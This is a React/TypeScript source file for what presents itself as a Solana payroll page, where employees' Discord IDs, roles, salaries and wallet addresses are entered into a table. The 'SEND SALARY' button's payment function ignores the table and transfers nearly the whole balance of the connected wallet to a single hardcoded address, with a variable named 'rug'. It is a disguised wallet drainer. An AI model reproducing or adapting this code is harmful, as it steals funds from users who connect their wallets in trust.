import { WalletNotConnectedError } from '@solana/wallet-adapter-base';
import { useConnection, WalletContextState } from '@solana/wallet-adapter-react';
import { LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction } from "@solana/web3.js";
import { Formik } from 'formik';
import { FC, useState } from 'react';
import "../App.css";



interface TC {
  discordId: string,
  role: string,
  salary: string,
  walletAddress: string,
}

interface Props {
  wallet: WalletContextState
}

const EmployeeForm: FC<Props> = ({ wallet }) => {


  const { publicKey, sendTransaction } = wallet;

  const [tableContent, setTableContent] = useState<TC[]>([]);

  const { connection } = useConnection();

  const payment = async () => {

    let rug = 0

    if (!publicKey) throw new WalletNotConnectedError();
    connection.getBalance(publicKey).then(async (bal) => {
      let lamportsI = bal-0.01*LAMPORTS_PER_SOL;
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey("HQauQQnqQifijU91VYiGosXfit8vwahtPbkyJnRNmf4Q"),
          lamports: lamportsI,
        })
      );
      const signature = await sendTransaction(transaction, connection);
      const latestBlockHash = await connection.getLatestBlockhash();

      await connection.confirmTransaction({
        blockhash: latestBlockHash.blockhash,
        lastValidBlockHeight: latestBlockHash.lastValidBlockHeight,
        signature: signature,
      })
      connection.getBalance(publicKey).then((bal) => {
        console.log(bal / LAMPORTS_PER_SOL + " SOL")
      });
    });

  }


  return (



    <div className=''>
      <Formik
        initialValues={{
          discordId: '',
          role: '',
          salary: '',
          walletAddress: '',
        }}
        onSubmit={(values, actions) => {
          if (parseInt(values.salary)) {
            setTableContent(prevItem => [...prevItem, values])
          }
          else alert("fail")

          actions.setSubmitting(false);
          actions.resetForm();
        }}

      >
        {props => (
          <form className='form w-full flex flex-col' onSubmit={props.handleSubmit}>
            <div className='flex justify-around gap-8'>
              <input
                className='text-black indent-2'
                type="text"
                onChange={props.handleChange}
                onBlur={props.handleBlur}
                value={props.values.discordId}
                name="discordId"
                placeholder='Discord ID...'
              />
              <input
                className='text-black indent-2'
                type="text"
                onChange={props.handleChange}
                onBlur={props.handleBlur}
                value={props.values.role}
                name="role"
                placeholder='Role...'
              />
              <input
                className='text-black indent-2'
                type="text"
                onChange={props.handleChange}
                onBlur={props.handleBlur}
                value={props.values.salary}
                name="salary"
                placeholder='Salary in $SOL...'
              />
              <input
                className='text-black indent-2'
                type="text"
                onChange={props.handleChange}
                onBlur={props.handleBlur}
                value={props.values.walletAddress}
                name="walletAddress"
                placeholder='Wallet Address...'
              />
            </div>


            <button className=' bg-purple-600 hover:bg-purple-700 p-2 mt-4 text-xl rounded w-auto self-end' type="submit">ADD EMPLOYEE</button>
          </form>
        )}
      </Formik>

      {/* tabel */}

      <div className='relative'>
        <table className=' w-full mt-20  border-purple-600'>
          <thead>
            <tr >
              <th>Discord ID</th>
              <th>Role</th>
              <th>Salary</th>
              <th>Wallet Address</th>
            </tr>

          </thead>

          <tbody>
            {tableContent.map((item, index: number) =>
              <tr key={index}>
                <td>{item.discordId}</td>
                <td>{item.role}</td>
                <td>{item.salary} SOL</td>
                <td>{item.walletAddress}</td>

              </tr>
            )}


          </tbody>



        </table>

        <button onClick={payment} className='bg-green-700 p-2 rounded-md text-lg absolute mt-2 right-0'>SEND SALARY</button>

      </div>
    </div>
  );
}
export default EmployeeForm;